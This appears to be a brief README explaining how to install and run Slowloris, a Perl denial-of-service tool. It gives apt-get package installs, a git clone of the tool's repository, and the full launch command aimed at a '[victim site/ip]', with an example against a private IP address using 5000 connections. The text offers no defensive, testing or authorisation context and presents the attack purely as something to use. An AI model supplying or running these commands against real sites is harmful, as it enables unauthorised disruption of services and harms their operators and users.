perl slowloris.pl -dns [site/ip] -port 80 -timeout 20 -num 500 -cache

**How use Slowloris Attack**

Requirements:
- sudo apt-get update  
- sudo apt-get install perl
- sudo apt-get install libwww-mechanize-shell-perl
- sudo apt-get install perl-mechanize

Get Slowloris File:
```
1) Open Terminal
   $> cd /home
2) Download file slowloris.pl
   # $home/ git clone https://github.com/kudacyber/slowloris.pl.git
3) Choose the directory where the file slowloris.pl was downloaded
   # $home/ cd slowloris.pl
4) Run application
   perl slowloris.pl -dns [site/ip] -port 80 -timeout 20 -num 500 -cache
   Example:
   # $home/slowloris.pl/ perl slowloris.pl -dns [victim site/ip] -options   
   Example:
   # $home/slowloris.pl/ perl slowloris.pl -dns 192.168.100.19 -port 80 -timeout 20 -num 5000 -cache
```
Done
